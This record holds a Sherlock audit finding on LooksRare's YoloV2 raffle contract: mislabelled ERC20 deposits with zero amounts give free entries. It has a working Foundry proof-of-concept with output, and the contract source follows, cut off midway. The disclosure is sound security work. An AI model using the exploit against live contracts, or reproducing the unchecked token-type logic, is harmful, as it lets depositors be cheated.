{
  "Title": "H-1: User can get free entries if the price of any whitelisted ERC20 token is greater than the round's `valuePerEntry`",
  "Content": "# Issue H-1: User can get free entries if the price of any whitelisted ERC20 token is greater than the round's `valuePerEntry` \n\nSource: https://github.com/sherlock-audit/2024-01-looksrare-judging/issues/4 \n\n## Found by \nKow, bughuntoor, mert\\_eren\n## Summary\nLack of explicit separation between ERC20 and ERC721 deposits allows users to gain free entries for any round given there exists a whitelisted ERC20 token with price greater than the round's `valuePerEntry`.\n\n## Vulnerability Detail\nWhen depositing tokens, users can specify whether the token type is ERC20 or ERC721. While the token address specified is checked against a whitelist, the token type specified is unrestricted.\nhttps://github.com/sherlock-audit/2024-01-looksrare/blob/7d76b96a58a6aee38f23bb38b8a5daa3bdc03f7c/contracts-yolo/contracts/YoloV2.sol#L1092-L1094\n```solidity\n                if (isCurrencyAllowed[tokenAddress] != 1) {\n                    revert InvalidCollection();\n                }\n```\nThis means a user can specify ERC721 as the token type even if the token being deposited is an ERC20 token. \nA deposit of this nature does not need signed Reservoir price data if the price is already specified (ie. the token was deposited before as an ERC20 token).\nhttps://github.com/sherlock-audit/2024-01-looksrare/blob/7d76b96a58a6aee38f23bb38b8a5daa3bdc03f7c/contracts-yolo/contracts/YoloV2.sol#L1096-L1100\n```solidity\n                if (singleDeposit.tokenType == YoloV2__TokenType.ERC721) {\n                    if (price == 0) {\n                        price = _getReservoirPrice(singleDeposit);\n                        prices[tokenAddress][roundId] = price;\n                    }\n```\nAs long as the price of the token is greater than `round.valuePerEntry`, the `entriesCount` will be non-zero. At the time of writing, using the `0.01 ETH` value used on the currently deployed Yolo contract, this is around USD$25.\nhttps://github.com/sherlock-audit/2024-01-looksrare/blob/7d76b96a58a6aee38f23bb38b8a5daa3bdc03f7c/contracts-yolo/contracts/YoloV2.sol#L1102-L1105\n```solidity\n                    uint256 entriesCount = price / round.valuePerEntry;\n                    if (entriesCount == 0) {\n                        revert InvalidValue();\n                    }\n```\nThe user can specify an arbitrary length array for `singleDeposit.tokenIdsOrAmounts` filled with zeros (given this doesn't exceed the max deposit limit). This is what allows free entries by specifying zero transfers.\nWhen the token is batch transferred by the transfer manager, a low level call to `transferFrom` on the specified token address is made.\nhttps://github.com/LooksRare/contracts-transfer-manager/blob/9c337db4b9a8a197353393e98e9120b69e8d1fc6/contracts/TransferManager.sol#L205-L210\n```solidity\n            } else if (tokenType == TokenType.ERC721) {\n                for (uint256 j; j < itemIdsLengthForSingleCollection; ) {\n                    ...\n                    _executeERC721TransferFrom(items[i].tokenAddress, from, to, itemIds[j]);\n```\nhttps://github.com/LooksRare/contracts-libs/blob/a6dbdc6a546fc80bcc3a18884ea3e5224cdc0547/contracts/lowLevelCallers/LowLevelERC721Transfer.sol#L24-L34\n```solidity\n    function _executeERC721TransferFrom(address collection, address from, address to, uint256 tokenId) internal {\n        ...\n        (bool status, ) = collection.call(abi.encodeCall(IERC721.transferFrom, (from, to, tokenId)));\n        ...\n    }\n```\nThe function signature of `transferFrom` for ERC721 and ERC20 is identical, so this will call `transferFrom` on the ERC20 contract with `amount = 0` (since 'token ids' specified in `singleDeposit.tokenIdsOrAmounts` are all `0`). Consequently, the user pays nothing and the transaction executes successfully (as long as the ERC20 token does not revert on zero transfers).\n\nPaste the test below into `Yolo.deposit.t.sol` with `forge-std/console.sol` imported. It demonstrates a user making 3 free deposits (in the same transaction) using the MKR token (ie. with zero MKR balance). The token used can be substituted with any token with price > `valuePerEntry = 0.01 ETH` (which is non-rebasing/non-taxable and has sufficient liquidity in their /ETH Uniswap v3 pool as specified in the README).\n\n<details>\n<summary>PoC</summary>\n\n```solidity\nfunction test_freeDeposit() public {\n        // setup MKR token\n        address MKR = 0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2;\n\n        vm.prank(owner);\n        priceOracle.addOracle(MKR, 3000);\n\n        address[] memory currencies = new address[](1);\n        currencies[0] = MKR;\n        vm.prank(operator);\n        yolo.updateCurrenciesStatus(currencies, true);\n\n        uint256 mkrAmt = 1 ether;\n\n        // deposit MKR to ensure price is already set for the round\n        // this could be made by the same user making the free deposits with minimal token amount\n        deal(MKR, user4, mkrAmt);\n\n        IYoloV2.DepositCalldata[] memory dcd = new IYoloV2.DepositCalldata[](1);\n        dcd = new IYoloV2.DepositCalldata[](1);\n        dcd[0].tokenType = IYoloV2.YoloV2__TokenType.ERC20;\n        dcd[0].tokenAddress = MKR;\n        uint256[] memory amounts = new uint256[](1);\n        amounts[0] = mkrAmt;\n        dcd[0].tokenIdsOrAmounts = amounts;\n\n        _grantApprovalsToTransferManager(user4);\n\n        vm.startPrank(user4);\n        IERC20(MKR).approve(address(transferManager), mkrAmt);\n        yolo.deposit(1, dcd);\n        vm.stopPrank();\n\n        // now deposit MKR as ERC721\n        // user doesn't need MKR balance to deposit\n        assertEq(IERC20(MKR).balanceOf(user5), 0);\n\n        dcd[0].tokenType = IYoloV2.YoloV2__TokenType.ERC721;\n        // we can use an arbitrary amount of tokens (so long as we don't exceed max deposits), but we use 3 here\n        amounts = new uint256[](3);\n        dcd[0].tokenIdsOrAmounts = amounts;\n        // we don't need a floor price config if the price has already been set\n\n        _grantApprovalsToTransferManager(user5);\n\n        vm.prank(user5);\n        yolo.deposit(1, dcd);\n\n        IYoloV2.Deposit[] memory deposits = _getDeposits(1);\n\n        (, , , , , , , uint256 valuePerEntry, , ) = yolo.getRound(1);\n        uint256 mkrPrice = yolo.prices(MKR, 1);\n        // last currentEntryIndex should be 4x since first depositor used 1e18 MKR,\n        // and the free depositor effectively used 3e18 MKR\n        assertEq(deposits[3].currentEntryIndex, (mkrPrice / valuePerEntry) * 4);\n\n        console.log(\"Standard deposit\");\n        console.log(\"Entry index after first deposit: \", deposits[0].currentEntryIndex);\n        console.log(\"Free deposits\");\n        console.log(\"Entry index after second deposit: \", deposits[1].currentEntryIndex);\n        console.log(\"Entry index after third deposit: \", deposits[2].currentEntryIndex);\n        console.log(\"Entry index after fourth deposit: \", deposits[3].currentEntryIndex);\n    }\n```\nOutput from running the test below.\n```shell\nRunning 1 test for test/foundry/Yolo.deposit.t.sol:Yolo_Deposit_Test\n[PASS] test_freeDeposit() (gas: 725484)\nLogs:\n  Standard deposit\n  Entry index after first deposit:  88\n  Free deposits\n  Entry index after second deposit:  176\n  Entry index after third deposit:  264\n  Entry index after fourth deposit:  352\n```\n</details>\n\n## Impact\nUsers can get an arbitrary number of entries into rounds for free (which should generally allow them to significantly increase their chances of winning). In the case the winner is a free depositor, they will end up with the same profit as if they participated normally since they have to pay the fee over the total value of the deposits (which includes the price of their free deposits). If the winner is an honest depositor, they still have to pay the full fee including the free entries, but they are unable to claim the value for the free entries (since the `tokenId` (or `amount`) is zero). They earn less profit than if everyone had participated honestly.\n\n## Code Snippet\nhttps://github.com/sherlock-audit/2024-01-looksrare/blob/7d76b96a58a6aee38f23bb38b8a5daa3bdc03f7c/contracts-yolo/contracts/YoloV2.sol#L1084-L1161\n\n## Tool used\n\nManual Review\n\n## Recommendation\nWhitelist tokens using both the token address and the token type (ERC20/ERC721).\n\n\n\n## Discussion\n\n**sherlock-admin2**\n\n1 comment(s) were left on this issue during the judging contest.\n\n**takarez** commented:\n>  valid: high(3)\n\n\n\n**nevillehuang**\n\nSee comments in #128\n\n",
  "Impact": "HIGH",
  "Source": "https://app.sherlock.xyz/audits/contests/163",
  "Code": [
    {
      "filename": "contracts-yolo/contracts/YoloV2.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.23;\n\nimport {ITransferManager} from \"@looksrare/contracts-transfer-manager/contracts/interfaces/ITransferManager.sol\";\nimport {TokenType as TransferManager__TokenType} from \"@looksrare/contracts-transfer-manager/contracts/enums/TokenType.sol\";\nimport {IERC20} from \"@looksrare/contracts-libs/contracts/interfaces/generic/IERC20.sol\";\nimport {SignatureCheckerMemory} from \"@looksrare/contracts-libs/contracts/SignatureCheckerMemory.sol\";\nimport {ReentrancyGuard} from \"@looksrare/contracts-libs/contracts/ReentrancyGuard.sol\";\nimport {Pausable} from \"@looksrare/contracts-libs/contracts/Pausable.sol\";\n\nimport {LowLevelWETH} from \"@looksrare/contracts-libs/contracts/lowLevelCallers/LowLevelWETH.sol\";\nimport {LowLevelERC20Transfer} from \"@looksrare/contracts-libs/contracts/lowLevelCallers/LowLevelERC20Transfer.sol\";\nimport {LowLevelERC721Transfer} from \"@looksrare/contracts-libs/contracts/lowLevelCallers/LowLevelERC721Transfer.sol\";\n\nimport {AccessControl} from \"@openzeppelin/contracts/access/AccessControl.sol\";\nimport {VRFCoordinatorV2Interface} from \"@chainlink/contracts/src/v0.8/interfaces/VRFCoordinatorV2Interface.sol\";\nimport {VRFConsumerBaseV2} from \"@chainlink/contracts/src/v0.8/VRFConsumerBaseV2.sol\";\n\nimport {IYoloV2} from \"./interfaces/IYoloV2.sol\";\nimport {IPriceOracle} from \"./interfaces/IPriceOracle.sol\";\nimport {Arrays} from \"./libraries/Arrays.sol\";\n\n//                                          @@@@@@@@@@@@@                                        @@@@@@@@@@@@@\n// @@@@@@@@@@@@@@@       @@@@@@@@@@@@@@ @@@@%*+++++++++*%@@@@     @@@@@@@@@@@@@@             @@@@%+-:::::::-+%@@@@\n//  @#:........=@@      @@*.........+@@@@*=================*@@@   @@=........=@@           @@@+.................+@@@\n//  @@=........:#@@     @@.........:@@%+=====================+%@@ @@=........=@@         @@%-.....................-#@@\n//  @@%:........=@@    @@=........:%@*=========================+%@@@=........=@@       @@%-.........................=@@@\n//   @@+........:#@   @@#........:%%============================+#@@=........=@@      @@#:...........................:#@@\n//    @@:........+@@  @@:.......:#%%@#*=======*%%@@@%%*==========+%@=........=@@      @#:.........:=*%%@%%#=..........:#@@\n//    @@#........:%@ @@+........+%+==+#@@*==#@@@@   @@@@#=========+@#........=@@     @%-........:*@@@@   @@@@+:........-%@\n//     @@=........=@@@#:.......-%*=======*@@@@         @@@=========*@:.......+@@    @@*.........@@@         @@%:........+@@\n//      @%:.......:%@@=........=@+========*@@            @%=========@+.......+@@    @@-........%@@           @@*........=%@\n//      @@+:.....:.-@#:.:......+@@@@@@@@@@@@             @@%%%%%%%%#@#::....:+@@    @@:.:.....:@@             @@::.:..:.-%@\n//       @%-::::::::*-:::::::::@@*+++++++*@@             @@+++++++++@*:::::::+@@    @@:::::::::%@            @@%::::::::-%@\n//       @@%********=:::::::::*@@*+*#%@@@##@@           @@*========+@=:::::::+@@    @@=::::::::=@@           @@=::::::::+@@\n//        @@@@@@@@@@:::::::::=@@@@@#*++++++*@@        @@@+=========%@::::::::+@@     @%:::::::::=@@@       @@@=:::::::::#@@\n//               @@=:::::::::%@ @@*++++++++++*@@@@@@@@@*+========+#@+::::::::+%@@@@@@@%+::::::::::+@@@@@@@@@+::::::::::+@@\n//              @@#:::::::::*@@  @@*+++++++++*@#++++++==========+*@@+::::::::::::::::::::::::::::::::-===-::::::::::::=@@\n//              @@-::::::::-%@    @@#++++++++%%+===============+#@@@+::::::::::::::::::::::::::::::::::::::::::::::::*@@\n//             @@+:::::::::*@@     @@@*+++++%%+===============*%@@@@+:::::::::::::::::::::*=:::::::::::::::::::::::=%@@\n//             @%-::::::::=@@        @@@#++#@*+============+*@@@  @@+:::::::::::::::::::::%@%+-::::::::::::::::::+%@@\n//            @@%*********%@@          @@@@@*+==========+#@@@@    @@#*********************%@@@@@*-:::::::::::-*@@@@\n//            @@@@@@@@@@@@@@              @@@@@@@%%%@@@@@@@       @@@@@@@@@@@@@@@@@@@@@@@@@@   @@@@@@@%%%@@@@@@@\n//                                               @@@@                                                @@@@@\n\n/**\n * @title YoloV2\n * @notice This contract permissionlessly hosts yolos on LooksRare.\n * @author LooksRare protocol team (ðŸ‘€,ðŸ’Ž)\n */\ncontract YoloV2 is\n    IYoloV2,\n    AccessControl,\n    VRFConsumerBaseV2,\n    LowLevelWETH,\n    LowLevelERC20Transfer,\n    LowLevelERC721Transfer,\n    ReentrancyGuard,\n    Pausable\n{\n    using Arrays for uint256[];\n\n    /**\n     * @notice Operators are allowed to add/remove allowed ERC-20 and ERC-721 tokens.\n     */\n    bytes32 public constant OPERATOR_ROLE = keccak256(\"OPERATOR_ROLE\");\n\n    /**\n     * @notice The TWAP period in seconds to use.\n     */\n    uint256 private constant TWAP_DURATION = 3_600;\n\n    /**\n     * @notice The maximum protocol fee in basis points, which is 25%.\n     */\n    uint16 public constant MAXIMUM_PROTOCOL_FEE_BP = 2_500;\n\n    /**\n     * @notice The maximum number of deposits per round.\n     */\n    uint256 private constant MAXIMUM_NUMBER_OF_DEPOSITS_PER_ROUND = 100;\n\n    /**\n     * @notice Reservoir oracle's message typehash.\n     * @dev It is used to compute the hash of the message using the (message) id, the payload, and the timestamp.\n     */\n    bytes32 private constant RESERVOIR_ORACLE_MESSAGE_TYPEHASH =\n        keccak256(\"Message(bytes32 id,bytes payload,uint256 timestamp,uint256 chainId)\");\n\n    /**\n     * @notice Reservoir oracle's ID typehash.\n     * @dev It is used to compute the hash of the ID using price kind, TWAP seconds, and the contract address.\n     */\n    bytes32 private constant RESERVOIR_ORACLE_ID_TYPEHASH =\n        keccak256(\n            \"ContractWideCollectionPrice(uint8 kind,uint256 twapSeconds,address contract,bool onlyNonFlaggedTokens)\"\n        );\n\n    /**\n     * @notice The bits offset of the round's maximum number of participants in a round slot.\n     */\n    uint256 private constant ROUND__MAXIMUM_NUMBER_OF_PARTICIPANTS_OFFSET = 8;\n\n    /**\n     * @notice The bits offset of the round's protocol fee basis points in a round slot.\n     */\n    uint256 private constant ROUND__PROTOCOL_FEE_BP_OFFSET = 48;\n\n    /**\n     * @notice The bits offset of the round's cutoff time in a round slot.\n     */\n    uint256 private constant ROUND__CUTOFF_TIME_OFFSET = 64;\n\n    /**\n     * @notice The bits offset of the round's value per entry in a round slot.\n     */\n    uint256 private constant ROUND__VALUE_PER_ENTRY_OFFSET = 160;\n\n    /**\n     * @notice The slot offset of the round's value per entry starting from the round's slot.\n     */\n    uint256 private constant ROUND__VALUE_PER_ENTRY_SLOT_OFFSET = 1;\n\n    /**\n     * @notice The bits offset of the randomness request's round ID in a randomness request slot.\n     */\n    uint256 private constant RANDOMNESS_REQUEST__ROUND_ID_OFFSET = 8;\n\n    /**\n     * @notice The slot offset of the round's deposits length starting from the round's slot.\n     */\n    uint256 private constant ROUND__DEPOSITS_LENGTH_SLOT_OFFSET = 3;\n\n    /**\n     * @notice The number of slots a round struct occupies.\n     */\n    uint256 private constant DEPOSIT__OCCUPIED_SLOTS = 4;\n\n    /**\n     * @notice The slot offset of the deposit's token ID starting from the deposit's slot.\n     */\n    uint256 private constant DEPOSIT__TOKEN_ID_SLOT_OFFSET = 1;\n\n    /**\n     * @notice The slot offset of the deposit's token amount starting from the deposit's slot.\n     */\n    uint256 private constant DEPOSIT__TOKEN_AMOUNT_SLOT_OFFSET = 2;\n\n    /**\n     * @notice The slot offset of the deposit's last slot starting from the deposit's slot.\n     */\n    uint256 private constant DEPOSIT__LAST_SLOT_OFFSET = 3;\n\n    /**\n     * @notice The bits offset of the deposit's token address in the deposit's slot 0.\n     */\n    uint256 private constant DEPOSIT__TOKEN_ADDRESS_OFFSET = 8;\n\n    /**\n     * @notice The bits offset of the deposit's current entry index in the deposit's slot 3.\n     */\n    uint256 private constant DEPOSIT__CURRENT_ENTRY_INDEX_OFFSET = 168;\n\n    /**\n     * @notice Wrapped Ether address.\n     */\n    address private immutable WETH;\n\n    /**\n     * @notice The key hash of the Chainlink VRF.\n     */\n    bytes32 private immutable KEY_HASH;\n\n    /**\n     * @notice The subscription ID of the Chainlink VRF.\n     */\n    uint64 public immutable SUBSCRIPTION_ID;\n\n    /**\n     * @notice The Chainlink VRF coordinator.\n     */\n    VRFCoordinatorV2Interface private immutable VRF_COORDINATOR;\n\n    /**\n     * @notice Transfer manager faciliates token transfers.\n     */\n    ITransferManager private immutable transferManager;\n\n    /**\n     * @notice LOOKS token address.\n     */\n    address private immutable LOOKS;\n\n    /**\n     * @notice The value of each entry in ETH.\n     */\n    uint96 public valuePerEntry;\n\n    /**\n     * @notice The duration of each round.\n     */\n    uint40 public roundDuration;\n\n    /**\n     * @notice The protocol fee basis points.\n     */\n    uint16 public protocolFeeBp;\n\n    /**\n     * @notice The protocol fee discount basis points if paid with LOOKS.\n     */\n    uint16 public protocolFeeDiscountBp;\n\n    /**\n     * @notice Number of rounds that have been created.\n     * @dev In this smart contract, roundId is an uint256 but its\n     *      max value can only be 2^40 - 1. Realistically we will still\n     *      not reach this number.\n     */\n    uint40 public roundsCount;\n\n    /**\n     * @notice The maximum number of participants per round.\n     */\n    uint40 public maximumNumberOfParticipantsPerRound;\n\n    /**\n     * @notice Whether token outflow is allowed.\n     */\n    bool public outflowAllowed = true;\n\n    /**\n     * @notice The address of the protocol fee recipient.\n     */\n    address public protocolFeeRecipient;\n\n    /**\n     * @notice ERC-20 oracle address.\n     */\n    IPriceOracle public erc20Oracle;\n\n    /**\n     * @notice Reservoir oracle address.\n     */\n    address public reservoirOracle;\n\n    /**\n     * @notice Reservoir oracle's signature validity period.\n     */\n    uint40 public signatureValidityPeriod;\n\n    /**\n     * @notice It checks whether the currency is allowed.\n     * @dev 0 is not allowed, 1 is allowed.\n     */\n    mapping(address currency => uint256 isAllowed) public isCurrencyAllowed;\n\n    mapping(uint256 roundId => Round) private rounds;\n\n    /**\n     * @notice The deposit count of a user in any given round.\n     */\n    mapping(uint256 roundId => mapping(address depositor => uint256 depositCount)) public depositCount;\n\n    /**\n     * @notice Chainlink randomness requests.\n     */\n    mapping(uint256 requestId => RandomnessRequest) public randomnessRequests;\n\n    /**\n     * @notice The price of an ERC-20/ERC-712 token or a collection in any given round.\n     */\n    mapping(address tokenOrCollection => mapping(uint256 roundId => uint256 price)) public prices;\n\n    /**\n     * @param params The constructor params.\n     */\n    constructor(ConstructorCalldata memory params) VRFConsumerBaseV2(params.vrfCoordinator) {\n        _grantRole(DEFAULT_ADMIN_ROLE, params.owner);\n        _grantRole(OPERATOR_ROLE, params.operator);\n        _updateRoundDuration(params.roundDuration);\n        _updateProtocolFeeRecipient(params.protocolFeeRecipient);\n        _updateProtocolFeeBp(params.protocolFeeBp);\n        _updateProtocolFeeDiscountBp(params.protocolFeeDiscountBp);\n        _updateValuePerEntry(params.valuePerEntry);\n        _updateERC20Oracle(params.erc20Oracle);\n        _updateMaximumNumberOfParticipantsPerRound(params.maximumNumberOfParticipantsPerRound);\n        _updateReservoirOracle(params.reservoirOracle);\n        _updateSignatureValidityPeriod(params.signatureValidityPeriod);\n\n        WETH = params.weth;\n        KEY_HASH = params.keyHash;\n        VRF_COORDINATOR = VRFCoordinatorV2Interface(params.vrfCoordinator);\n        SUBSCRIPTION_ID = params.subscriptionId;\n        LOOKS = params.looks;\n\n        transferManager = ITransferManager(params.transferManager);\n\n        _startRound({_roundsCount: 0});\n    }\n\n    /**\n     * @inheritdoc IYoloV2\n     */\n    function deposit(uint256 roundId, DepositCalldata[] calldata deposits) external payable nonReentrant whenNotPaused {\n        _deposit(roundId, deposits);\n    }\n\n    /**\n     * @inheritdoc IYoloV2\n     */\n    function depositETHIntoMultipleRounds(uint256[] calldata amounts) external payable nonReentrant whenNotPaused {\n        uint256 numberOfRounds = amounts.length;\n        if (msg.value == 0 || numberOfRounds == 0) {\n            revert ZeroDeposits();\n        }\n\n        uint256 startingRoundId = roundsCount;\n        Round storage startingRound = rounds[startingRoundId];\n        _validateRoundIsOpen(startingRound);\n\n        _setCutoffTimeIfNotSet(startingRound);\n\n        uint256 expectedValue;\n        uint256[] memory entriesCounts = new uint256[](numberOfRounds);\n\n        for (uint256 i; i < numberOfRounds; ++i) {\n            uint256 roundId = _unsafeAdd(startingRoundId, i);\n            Round storage round = rounds[roundId];\n            uint256 roundValuePerEntry = round.valuePerEntry;\n            if (roundValuePerEntry == 0) {\n                (, , roundValuePerEntry) = _writeDataToRound({roundId: roundId, roundValue: 0});\n            }\n\n            _incrementUserDepositCount(roundId, round);\n\n            uint256 depositAmount = amounts[i];\n            if (depositAmount % roundValuePerEntry != 0) {\n                revert InvalidValue();\n            }\n            uint256 entriesCount = _depositETH(round, roundId, roundValuePerEntry, depositAmount);\n            expectedValue += depositAmount;\n\n            entriesCounts[i] = entriesCount;\n        }\n\n        if (expectedValue != msg.value) {\n            revert InvalidValue();\n        }\n\n        emit MultipleRoundsDeposited(msg.sender, startingRoundId, amounts, entriesCounts);\n\n        if (\n            _shouldDrawWinner(\n                startingRound.numberOfParticipants,\n                startingRound.maximumNumberOfParticipants,\n                startingRound.deposits.length\n            )\n        ) {\n            _drawWinner(startingRound, startingRoundId);\n        }\n    }\n\n    /**\n     * @inheritdoc IYoloV2\n     */\n    function getRound(\n        uint256 roundId\n    )\n        external\n        view\n        returns (\n            RoundStatus status,\n            uint40 maximumNumberOfParticipants,\n            uint16 roundProtocolFeeBp,\n            uint40 cutoffTime,\n            uint40 drawnAt,\n            uint40 numberOfParticipants,\n            address winner,\n            uint96 roundValuePerEntry,\n            uint256 protocolFeeOwed,\n            Deposit[] memory deposits\n        )\n    {\n        Round memory round = rounds[roundId];\n        status = round.status;\n        maximumNumberOfParticipants = round.maximumNumberOfParticipants;\n        roundProtocolFeeBp = round.protocolFeeBp;\n        cutoffTime = round.cutoffTime;\n        drawnAt = round.drawnAt;\n        numberOfParticipants = round.numberOfParticipants;\n        winner = round.winner;\n        roundValuePerEntry = round.valuePerEntry;\n        protocolFeeOwed = round.protocolFeeOwed;\n        deposits = round.deposits;\n    }\n\n    /**\n     * @inheritdoc IYoloV2\n     */\n    function drawWinner() external nonReentrant whenNotPaused {\n        uint256 roundId = roundsCount;\n        Round storage round = rounds[roundId];\n\n        _validateRoundStatus(round, RoundStatus.Open);\n\n        if (block.timestamp < round.cutoffTime) {\n            revert CutoffTimeNotReached();\n        }\n\n        if (round.numberOfParticipants < 2) {\n            revert InsufficientParticipants();\n        }\n\n        _drawWinner(round, roundId);\n    }\n\n    /**\n     * @inheritdoc IYoloV2\n     */\n    function cancel() external nonReentrant {\n        _validateOutflowIsAllowed();\n        _cancel({roundId: roundsCount});\n    }\n\n    /**\n     * @inheritdoc IYoloV2\n     */\n    function cancel(uint256 numberOfRounds) external {\n        _validateIsOwner();\n\n        if (numberOfRounds == 0) {\n            revert ZeroRounds();\n        }\n\n        uint256 startingRoundId = roundsCount;\n\n        for (uint256 i; i < numberOfRounds; ++i) {\n            uint256 roundId = _unsafeAdd(startingRoundId, i);\n            rounds[roundId].status = RoundStatus.Cancelled;\n        }\n\n        emit RoundsCancelled(startingRoundId, numberOfRounds);\n\n        _startRound({_roundsCount: _unsafeSubtract(_unsafeAdd(startingRoundId, numberOfRounds), 1)});\n    }\n\n    /**\n     * @inheritdoc IYoloV2\n     */\n    function cancelAfterRandomnessRequest() external nonReentrant {\n        _validateOutflowIsAllowed();\n\n        uint256 roundId = roundsCount;\n        Round storage round = rounds[roundId];\n\n        _validateRoundStatus(round, RoundStatus.Drawing);\n\n        if (block.timestamp < round.drawnAt + 1 days) {\n            revert DrawExpirationTimeNotReached();\n        }\n\n        round.status = RoundStatus.Cancelled;\n\n        emit RoundStatusUpdated(roundId, RoundStatus.Cancelled);\n\n        _startRound({_roundsCount: roundId});\n    }\n\n    /**\n     * @inheritdoc IYoloV2\n     */\n    function claimPrizes(\n        WithdrawalCalldata[] calldata withdrawalCalldata,\n        bool payWithLOOKS\n    ) external payable nonReentrant {\n        _validateOutflowIsAllowed();\n\n        TransferAccumulator memory transferAccumulator;\n        uint256 ethAmount;\n        uint256 protocolFeeOwed;\n\n        _validateArrayLengthIsNotEmpty(withdrawalCalldata.length);\n\n        if (payWithLOOKS) {\n            if (msg.value != 0) {\n                revert InvalidValue();\n            }\n        }\n\n        for (uint256 i; i < withdrawalCalldata.length; ++i) {\n            WithdrawalCalldata calldata perRoundWithdrawalCalldata = withdrawalCalldata[i];\n\n            Round storage round = rounds[perRoundWithdrawalCalldata.roundId];\n\n            _validateRoundStatus(round, RoundStatus.Drawn);\n            _validateMsgSenderIsWinner(round);\n\n            uint256[] calldata depositIndices = perRoundWithdrawalCalldata.depositIndices;\n            _validateArrayLengthIsNotEmpty(depositIndices.length);\n\n            for (uint256 j; j < depositIndices.length; ++j) {\n                uint256 index = depositIndices[j];\n                _validateDepositsArrayIndex(index, round);\n                ethAmount = _transferTokenOut(round.deposits[index], transferAccumulator, ethAmount);\n            }\n\n            protocolFeeOwed += round.protocolFeeOwed;\n            round.protocolFeeOwed = 0;\n        }\n\n        if (protocolFeeOwed != 0) {\n            if (payWithLOOKS) {\n                protocolFeeOwed = _protocolFeeOwedInLOOKS(protocolFeeOwed);\n\n                transferManager.transferERC20(LOOKS, msg.sender, protocolFeeRecipient, protocolFeeOwed);\n\n                emit ProtocolFeePayment(protocolFeeOwed, LOOKS);\n            } else {\n                _transferETHAndWrapIfFailWithGasLimit(WETH, protocolFeeRecipient, protocolFeeOwed, gasleft());\n\n                emit ProtocolFeePayment(protocolFeeOwed, address(0));\n\n                protocolFeeOwed -= msg.value;\n                if (protocolFeeOwed <= ethAmount) {\n                    unchecked {\n                        ethAmount -= protocolFeeOwed;\n                    }\n                } else {\n                    revert ProtocolFeeNotPaid();\n                }\n            }\n        }\n\n        if (transferAccumulator.amount != 0) {\n            _executeERC20DirectTransfer(transferAccumulator.tokenAddress, msg.sender, transferAccumulator.amount);\n        }\n\n        if (ethAmount != 0) {\n            _transferETHAndWrapIfFailWithGasLimit(WETH, msg.sender, ethAmount, gasleft());\n        }\n\n        emit PrizesClaimed(msg.sender, withdrawalCalldata);\n    }\n\n    /**\n     * @inheritdoc IYoloV2\n     * @dev This function does not validate withdrawalCalldata to not contain duplicate round IDs and prize indices.\n     *      It is the responsibility of the caller to ensure that. Otherwise, the returned protocol fee owed will be incorrect.\n     */\n    function getClaimPrizesPaymentRequired(\n        WithdrawalCalldata[] calldata withdrawalCalldata,\n        bool payWithLOOKS\n    ) external view returns (uint256 protocolFeeOwed) {\n        uint256 ethAmount;\n\n        for (uint256 i; i < withdrawalCalldata.length; ++i) {\n            WithdrawalCalldata calldata perRoundWithdrawalCalldata = withdrawalCalldata[i];\n            Round storage round = rounds[perRoundWithdrawalCalldata.roundId];\n\n            _validateRoundStatus(round, RoundStatus.Drawn);\n\n            uint256[] calldata depositIndices = perRoundWithdrawalCalldata.depositIndices;\n            uint256 numberOfPrizes = depositIndices.length;\n            uint256 prizesCount = round.deposits.length;\n\n            for (uint256 j; j < numberOfPrizes; ++j) {\n                uint256 index = depositIndices[j];\n                if (index >= prizesCount) {\n                    revert InvalidIndex();\n                }\n\n                Deposit storage prize = round.deposits[index];\n                if (prize.tokenType == YoloV2__TokenType.ETH) {\n                    ethAmount += prize.tokenAmount;\n                }\n            }\n\n            protocolFeeOwed += round.protocolFeeOwed;\n        }\n\n        if (payWithLOOKS) {\n            protocolFeeOwed = _protocolFeeOwedInLOOKS(protocolFeeOwed);\n        } else {\n            if (protocolFeeOwed < ethAmount) {\n                protocolFeeOwed = 0;\n            } else {\n                unchecked {\n                    protocolFeeOwed -= ethAmount;\n                }\n            }\n        }\n    }\n\n    /**\n     * @inheritdoc IYoloV2\n     */\n    function withdrawDeposits(WithdrawalCalldata[] calldata withdrawalCalldata) external nonReentrant {\n        _validateOutflowIsAllowed();\n\n        TransferAccumulator memory transferAccumulator;\n        uint256 ethAmount;\n\n        _validateArrayLengthIsNotEmpty(withdrawalCalldata.length);\n\n        for (uint256 i; i < withdrawalCalldata.length; ++i) {\n            WithdrawalCalldata calldata perRoundWithdrawalCalldata = withdrawalCalldata[i];\n\n            Round storage round = rounds[perRoundWithdrawalCalldata.roundId];\n\n            _validateRoundStatus(round, RoundStatus.Cancelled);\n\n            uint256[] calldata depositIndices = perRoundWithdrawalCalldata.depositIndices;\n            uint256 depositIndicesLength = depositIndices.length;\n            _validateArrayLengthIsNotEmpty(depositIndicesLength);\n\n            for (uint256 j; j < depositIndicesLength; ++j) {\n                uint256 index = depositIndices[j];\n                _validateDepositsArrayIndex(index, round);\n\n                Deposit storage singleDeposit = round.deposits[index];\n\n                _validateMsgSenderIsDepositor(singleDeposit);\n\n                ethAmount = _transferTokenOut(singleDeposit, transferAccumulator, ethAmount);\n            }\n        }\n\n        if (transferAccumulator.amount != 0) {\n            _executeERC20DirectTransfer(transferAccumulator.tokenAddress, msg.sender, transferAccumulator.amount);\n        }\n\n        if (ethAmount != 0) {\n            _transferETHAndWrapIfFailWithGasLimit(WETH, msg.sender, ethAmount, gasleft());\n        }\n\n        emit DepositsWithdrawn(msg.sender, withdrawalCalldata);\n    }\n\n    /**\n     * @inheritdoc IYoloV2\n     */\n    function rolloverETH(\n        WithdrawalCalldata[] calldata withdrawalCalldata,\n        bool payWithLOOKS\n    ) external nonReentrant whenNotPaused {\n        uint256 rolloverAmount;\n        uint256 protocolFeeOwed;\n\n        uint256 withdrawalCalldataLength = withdrawalCalldata.length;\n        _validateArrayLengthIsNotEmpty(withdrawalCalldataLength);\n\n        for (uint256 i; i < withdrawalCalldataLength; ++i) {\n            WithdrawalCalldata calldata perRoundWithdrawalCalldata = withdrawalCalldata[i];\n\n            Round storage cancelledOrDrawnRound = rounds[perRoundWithdrawalCalldata.roundId];\n\n            RoundStatus status = cancelledOrDrawnRound.status;\n            if (status < RoundStatus.Drawn) {\n                revert InvalidStatus();\n            }\n\n            if (status == RoundStatus.Drawn) {\n                _validateMsgSenderIsWinner(cancelledOrDrawnRound);\n                protocolFeeOwed += cancelledOrDrawnRound.protocolFeeOwed;\n                cancelledOrDrawnRound.protocolFeeOwed = 0;\n            }\n\n            uint256[] calldata depositIndices = perRoundWithdrawalCalldata.depositIndices;\n            uint256 depositIndicesLength = depositIndices.length;\n            